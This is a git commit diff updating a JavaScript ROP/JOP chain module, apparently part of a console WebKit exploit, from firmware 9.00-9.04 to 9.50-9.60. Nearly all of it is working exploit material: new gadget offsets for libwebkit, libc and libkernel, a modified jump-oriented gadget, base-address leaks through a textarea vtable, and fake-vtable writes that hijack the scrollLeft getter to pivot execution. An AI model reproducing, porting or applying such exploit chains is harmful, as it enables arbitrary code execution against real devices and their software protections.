90302cd2fc0cdefedea3cec327995d3f584d8b87
shika900 <132929430+shika900@users.noreply.github.com>
2025-08-23 18:57:29 +0300

    Add files via upload

--- 9/rop/950.mjs
+++ 9/rop/950.mjs
@@ -15,7 +15,7 @@ GNU Affero General Public License for more details.
 You should have received a copy of the GNU Affero General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 
-// 9.00, 9.03, 9.04
+// 9.50, 9.51, 9.60
 // ROP Chain by @janisslsm
 
 import { mem } from "../../module/mem.mjs";
@@ -57,7 +57,8 @@ call qword ptr [rax + 0xb8]
 // This will make pivoting back easy, just "leave; ret".
 const jop2 = `
 pop rsi
-jmp qword ptr [rax + 0x1c]
+cmc
+jmp qword ptr [rax + 0x7c]
 `;
 const jop3 = `
 mov rdi, qword ptr [rax + 8]
@@ -98,56 +99,57 @@ const jop7 = "pop rsp; ret";
 
 const webkit_gadget_offsets = new Map(
   Object.entries({
-    "pop rax; ret": 0x0000000000051a12, // `58 c3`
-    "pop rbx; ret": 0x00000000000be5d0, // `5b c3`
-    "pop rcx; ret": 0x00000000000657b7, // `59 c3`
-    "pop rdx; ret": 0x000000000000986c, // `5a c3`
+    "pop rax; ret": 0x0000000000011c46, // `58 c3`
+    "pop rbx; ret": 0x0000000000013730, // `5b c3`
+    "pop rcx; ret": 0x0000000000035a1e, // `59 c3`
+    "pop rdx; ret": 0x000000000018de52, // `5a c3`
 
     "pop rbp; ret": 0x00000000000000b6, // `5d c3`
-    "pop rsi; ret": 0x000000000001f4d6, // `5e c3`
-    "pop rdi; ret": 0x0000000000319690, // `5f c3`
-    "pop rsp; ret": 0x000000000004e293, // `5c c3`
+    "pop rsi; ret": 0x0000000000092a8c, // `5e c3`
+    "pop rdi; ret": 0x000000000005d19d, // `5f c3`
+    "pop rsp; ret": 0x00000000000253e0, // `5c c3`
 
-    "pop r8; ret": 0x00000000001a7ef1, // `47 58 c3`
-    "pop r9; ret": 0x0000000000422571, // `47 59 c3`
-    "pop r10; ret": 0x0000000000e9e1d1, // `47 5a c3`
-    "pop r11; ret": 0x00000000012b1d51, // `47 5b c3`
+    "pop r8; ret": 0x000000000003fe32, // `47 58 c3`
+    "pop r9; ret": 0x0000000000aaad51, // `47 59 c3`
+    // Not found in 9.50-9.60, but not currently used in exploit
+    // "pop r10; ret" : 0x0000000000000000, // `4(1,3,5,7,9,b,d,f) 5a c3`
+    "pop r11; ret": 0x0000000001833a21, // `47 5b c3`
 
-    "pop r12; ret": 0x000000000085ec71, // `47 5c c3`
-    "pop r13; ret": 0x00000000001da461, // `47 5d c3`
-    "pop r14; ret": 0x0000000000685d73, // `47 5e c3`
-    "pop r15; ret": 0x00000000006ab3aa, // `47 5f c3`
+    "pop r12; ret": 0x0000000000420ad1, // `47 5c c3`
+    "pop r13; ret": 0x00000000018fc4c1, // `47 5d c3`
+    "pop r14; ret": 0x000000000028c900, // `41 5e c3`
+    "pop r15; ret": 0x0000000001437c8a, // `47 5f c3`
 
     "ret": 0x0000000000000032, // `c3`
-    "leave; ret": 0x000000000008db5b, // `c9 c3`
+    "leave; ret": 0x0000000000056322, // `c9 c3`
 
-    "mov rax, qword ptr [rax]; ret": 0x00000000000241cc, // `48 8b 00 c3`
-    "mov qword ptr [rdi], rax; ret": 0x000000000000613b, // `48 89 07 c3`
-    "mov dword ptr [rdi], eax; ret": 0x000000000000613c, // `89 07 c3`
-    "mov dword ptr [rax], esi; ret": 0x00000000005c3482, // `89 30 c3`
+    "mov rax, qword ptr [rax]; ret": 0x000000000000c671, // `48 8b 00 c3`
+    "mov qword ptr [rdi], rax; ret": 0x0000000000010c07, // `48 89 07 c3`
+    "mov dword ptr [rdi], eax; ret": 0x00000000000071d0, // `89 07 c3`
+    "mov dword ptr [rax], esi; ret": 0x000000000007ebd8, // `89 30 c3`
 
-    [jop1]: 0x00000000004e62a4, // `48 8b 7e 18 48 8b 07 ff 90 b8 00 00 00`
-    [jop2]: 0x00000000021fce7e, // `5e ff 60 1c`
-    [jop3]: 0x00000000019becb4, // `48 8b 78 08 48 8b 07 ff 60 30`
+    [jop1]: 0x000000000060fd94, // `48 8b 7e 18 48 8b 07 ff 90 b8 00 00 00`
+    [jop2]: 0x0000000002bf3741, // `5e f5 ff 60 7c`
+    [jop3]: 0x000000000181e974, // `48 8b 78 08 48 8b 07 ff 60 30`
 
-    [jop4]: 0x0000000000683800, // `55 48 89 e5 48 8b 07 ff 50 58`
-    [jop5]: 0x0000000000303906, // `48 8b 50 18 48 8b 07 ff 50 10`
-    [jop6]: 0x00000000028bd332, // `52 ff 20`
-    [jop7]: 0x000000000004e293, // `5c c3`
+    [jop4]: 0x00000000001a75a0, // `55 48 89 e5 48 8b 07 ff 50 58`
+    [jop5]: 0x000000000035fc94, // `48 8b 50 18 48 8b 07 ff 50 10`
+    [jop6]: 0x00000000002b7a9c, // `52 ff 20`
+    [jop7]: 0x00000000000253e0, // `5c c3`
   }),
 );
 
 const libc_gadget_offsets = new Map(
   Object.entries({
-    "getcontext": 0x24f04,
-    "setcontext": 0x29448,
+    "getcontext": 0x21284,
+    "setcontext": 0x254dc,
   }),
 );
 
 const libkernel_gadget_offsets = new Map(
   Object.entries({
     // returns the location of errno
-    "__error": 0xcb80,
+    "__error": 0xbb60,
   }),
 );
 
@@ -157,17 +159,17 @@ function get_bases() {
   const textarea = document.createElement("textarea");
   const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
   const textarea_vtable = webcore_textarea.readp(0);
-  const off_ta_vt = 0x2e73c18;
+  const off_ta_vt = 0x2ebea68;
   const libwebkit_base = textarea_vtable.sub(off_ta_vt);
 
   const stack_chk_fail_import = libwebkit_base.add(offset_wk_stack_chk_fail);
   const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
-  const off_scf = 0x1ff60;
+  const off_scf = 0x28870;
   const libkernel_base = stack_chk_fail_addr.sub(off_scf);
 
   const strlen_import = libwebkit_base.add(offset_wk_strlen);
   const strlen_addr = resolve_import(strlen_import);
-  const off_strlen = 0x4fa40;
+  const off_strlen = 0x4c040;
   const libc_base = strlen_addr.sub(off_strlen);
 
   return [libwebkit_base, libkernel_base, libc_base];
@@ -179,7 +181,7 @@ export function init_gadget_map(gadget_map, offset_map, base_addr) {
   }
 }
 
-class Chain900Base extends ChainBase {
+class Chain950Base extends ChainBase {
   push_end() {
     this.push_gadget("leave; ret");
   }
@@ -208,7 +210,7 @@ class Chain900Base extends ChainBase {
   }
 }
 
-export class Chain900 extends Chain900Base {
+export class Chain950 extends Chain950Base {
   constructor() {
     super();
 
@@ -233,7 +235,7 @@ export class Chain900 extends Chain900Base {
     // 0x1b8 is the offset of the scrollLeft getter native function
     vtable.write64(0x1b8, this.get_gadget(jop1));
     vtable.write64(0xb8, this.get_gadget(jop2));
-    vtable.write64(0x1c, this.get_gadget(jop3));
+    vtable.write64(0x7c, this.get_gadget(jop3));
 
     // for the JOP chain
     const rax_ptrs = new BufferView(0x100);
@@ -263,7 +265,7 @@ export class Chain900 extends Chain900Base {
   }
 }
 
-export const Chain = Chain900;
+export const Chain = Chain950;
 
 export function init(Chain) {
   const syscall_array = [];
